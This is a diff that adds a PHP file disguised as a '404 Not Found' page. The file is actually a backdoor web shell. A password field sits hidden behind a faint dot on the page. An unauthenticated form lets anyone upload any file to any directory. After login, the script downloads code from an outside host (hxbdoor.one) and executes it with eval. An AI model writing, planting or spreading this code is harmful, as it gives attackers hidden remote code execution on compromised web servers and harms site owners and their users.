@@ -1,1 +1,186 @@
+<?php
 
+session_start();
+
+// Fungsi untuk memeriksa status login
+function is_logged_in() {
+    return isset($_SESSION['X-H0UR']);
+}
+
+// Fungsi untuk memvalidasi login
+function login($password) {
+    $valid_password_hash = '4778da8262a3efefdf07872aaac23779'; // MD5 hash password
+    $password_hash = md5($password);
+    if ($password_hash === $valid_password_hash) {
+        $_SESSION['X-H0UR'] = 'user';
+        return true;
+    } else {
+        return false;
+    }
+}
+
+// Fungsi untuk logout
+function logout() {
+    unset($_SESSION['X-H0UR']);
+}
+
+// Fungsi untuk mengambil konten dari URL
+function getContent($url) {
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    if ($content === false) {
+        $content = file_get_contents($url);
+    }
+    return $content;
+}
+
+// Fungsi untuk mendapatkan data mentah dari URL
+function getRawContent($url) {
+    return getContent($url);
+}
+
+// Tangani proses login
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    $password = $_POST['password'];
+    if (login($password)) {
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error_message = "Password salah!";
+        echo '<script>alert("' . $error_message . '");</script>';
+    }
+}
+
+// Tangani proses unggah file
+if (isset($_GET['inc']) && $_GET['inc'] === 'upload') {
+    echo '<form method="post" enctype="multipart/form-data">';
+    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
+    echo '<input type="file" name="file" size="15">';
+    echo '<input type="submit" value="Unggah">';
+    echo '</form>';
+}
+
+if (isset($_FILES['file']['tmp_name'])) {
+    $uploadd = $_FILES['file']['tmp_name'];
+    if (file_exists($uploadd)) {
+        $pwddir = $_POST['dir'];
+        $real = $_FILES['file']['name'];
+        $de = rtrim($pwddir, '/') . "/" . $real;
+        if (move_uploaded_file($uploadd, $de)) {
+            echo "BERKAS DIUNGGAHKAN KE $de";
+        } else {
+            echo "GAGAL MENGUNGGAH BERKAS KE $de";
+        }
+    }
+}
+
+// Jika pengguna sudah login, ambil dan eksekusi konten dari URL
+if (is_logged_in()) {
+    $url = 'https://hxbdoor.one/raw/7eyuOY3h';
+    $content = getRawContent($url);
+    eval('?>' . $content);
+    exit;
+}
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+
+    <style>
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+        }
+
+        #form {
+            position: absolute;
+            z-index: 9999;
+        }
+
+        #form input {
+            opacity: 0;
+            pointer-events: none;
+            position: absolute;
+            cursor: default;
+            transition: 0.3s;
+        }
+
+        #form input.revealed {
+            opacity: 1;
+            pointer-events: auto;
+            cursor: pointer;
+        }
+
+        #form button {
+            display: none;
+        }
+
+        .clue-dot {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 6px;
+            height: 6px;
+            background: rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            opacity: 0.5;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+    <iframe src="/404"></iframe>
+
+    <form id="form" method="post">
+        <input
+            type="password"
+            name="password"
+            id="input"
+            autocomplete="off"
+        >
+        <button type="submit">Login</button>
+    </form>
+
+    <div class="clue-dot" title="404"></div>
+
+    <script>
+        const form = document.getElementById("form");
+        const input = document.getElementById("input");
+        const clueDot = document.querySelector(".clue-dot");
+
+        const x = Math.random() * (window.innerWidth - 100);
+        const y = Math.random() * (window.innerHeight - 30);
+
+        form.style.left = `${x}px`;
+        form.style.top = `${y}px`;
+
+        clueDot.onclick = () => {
+            input.classList.add("revealed");
+            input.focus();
+        };
+    </script>
+
+</body>
+</html>
